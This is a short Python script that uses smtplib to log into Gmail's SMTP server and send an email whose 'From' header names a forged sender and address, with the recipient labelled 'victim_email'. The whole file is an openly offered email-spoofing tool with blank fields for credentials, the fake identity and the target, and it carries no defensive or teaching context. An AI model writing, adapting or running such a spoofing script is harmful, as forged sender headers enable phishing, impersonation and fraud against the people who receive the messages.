#Use the smtplib to send an e-mail
import smtplib
#Configuration
#Your e-mail address, the real one
sender_email = '@gmail.com'
#Your e-mail username
username = '@gmail.com'
#Password required for your e-mail account
password = ''
#Spoofed e-mail information

spoofed_email = ''
#Spoofed full name
spoofed_name = ''
#Victim e-mail address 
victim_email = '' 
# E-mail subject 
subject= "this is a subject\n"
# E-mail body message
body = "This is a body."
 
header = ('To:' + victim_email + '\n' +'From: ' + spoofed_name + ' <' + spoofed_email + '>' + '\n' + 'Subject:' + subject)
message = (header + '\n\n' + body + '\n\n')
 
try:
      session = smtplib.SMTP('smtp.gmail.com','587')
      session.starttls()
      session.login(username, password)
      session.sendmail(sender_email, victim_email, message)
      session.quit()
      print("Email Sent With Success!")
except smtplib.SMTPException:
      print("Error: Unable To Send The Email!")